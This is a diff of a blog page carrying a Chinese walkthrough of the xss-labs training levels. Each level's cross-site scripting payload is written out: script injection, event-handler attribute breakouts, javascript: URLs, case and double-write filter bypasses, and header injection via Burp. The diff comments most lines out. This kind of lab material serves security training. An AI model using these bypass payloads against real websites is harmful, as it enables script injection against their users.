@@ -75,22 +75,36 @@
   <div class="article-content">
     <div class="entry">
       
-        <p>XSS-vulfocus/xss-labs</p>
-<p>/**</p>
-<p>第一关：通过控制台输入alert()或者通过URL上test替换为<script>alert(/xss/)</script>。</p>
-<p>第二关：将keyword的值替换为keyword=”&gt;<script>alert('xss')</script> //或者用<code>&quot;&gt;</code>闭合value标签”&gt;<script>alert(1)</script>。</p>
-<p>第三关：将keyword的值替换为keyword=’onfocus=javascript:alert(‘xss’) &gt; //&amp;submit=搜索，鼠标移至输入框。</p>
-<p>第四关：将keyword的值替换为keyword=”onfocus=javascript:alert(‘xss’) “，点击输入框。</p>
-<p>第五关：将keyword的值替换为keyword=”&gt; &lt;a href=javascript:alert(‘xss’) &gt; xss</a> //，点击链接</p>
-<p>或者直接通过超链接输入”&gt; 12<a href="javascript:alert(1)">34</a></p>
-<p>第六关：大小写绕过，”&gt;<Script>alert(1)</script></p>
-<p>第七关：双写绕过的方式，”&gt;<scscriptript>alert(1)</scrscriptipt></p>
+        <!--XSS-vulfocus/xss-labs-->
+
+<!--/**-->
+
+<!--第一关：通过控制台输入alert()或者通过URL上test替换为<script>alert(/xss/)</script>。-->
+
+<!--第二关：将keyword的值替换为keyword="><script>alert('xss')</script> //或者用`">`闭合value标签"><script>alert(1)</script>。-->
+
+<!--第三关：将keyword的值替换为keyword='onfocus=javascript:alert('xss') > //&submit=搜索，鼠标移至输入框。-->
+
+<!--第四关：将keyword的值替换为keyword="onfocus=javascript:alert('xss') "，点击输入框。-->
+
+<!--第五关：将keyword的值替换为keyword="> <a href=javascript:alert('xss') > xss</a> //，点击链接-->
+
+<!--或者直接通过超链接输入"> 12<a href="javascript:alert(1)">34</a>-->
+
+<!--第六关：大小写绕过，"><Script>alert(1)</script>-->
+
+<!--第七关：双写绕过的方式，"><scscriptript>alert(1)</scrscriptipt>-->
+
 <p>第八关：转义字符绕过的方式，java&amp;#115cript:alert(1)</p>
-<p>第九关：链接不合法，所以添加https//，不过直接加语句不合法，所以在最后面注释掉http://通过检测就行，java&amp;#115cript:alert(1)  //http:// </p>
-<p>第十关：查看源代码得知有三个值被隐藏掉了，对这三个值依次赋值查看源码，得知只有第三个值有反应，将第三个值赋为” type=”text” onmouseover=”alert(1)</p>
-<p>第十一关：查看源代码得知有t_ref的value是个URL，burp抓包将reference替换为click me !” type=”button” onclick=”alert(/xss/)</p>
-<p>第十二关：查看源代码得知有t_ua的value有内容，burp抓包将user-Agent替换为click me !” type=”button” onclick=”alert(/xss/)</p>
-<p>*/</p>
+<!--<!--第九关：链接不合法，所以添加https//，不过直接加语句不合法，所以在最后面注释掉http://通过检测就行，java&#115cript:alert(1)  //http://-->--> 
+
+<!--第十关：查看源代码得知有三个值被隐藏掉了，对这三个值依次赋值查看源码，得知只有第三个值有反应，将第三个值赋为" type="text" onmouseover="alert(1)-->
+
+<!--第十一关：查看源代码得知有t_ref的value是个URL，burp抓包将reference替换为click me !" type="button" onclick="alert(/xss/)-->
+
+<!--第十二关：查看源代码得知有t_ua的value有内容，burp抓包将user-Agent替换为click me !" type="button" onclick="alert(/xss/)-->
+
+<!--*/-->
 
       
     </div>
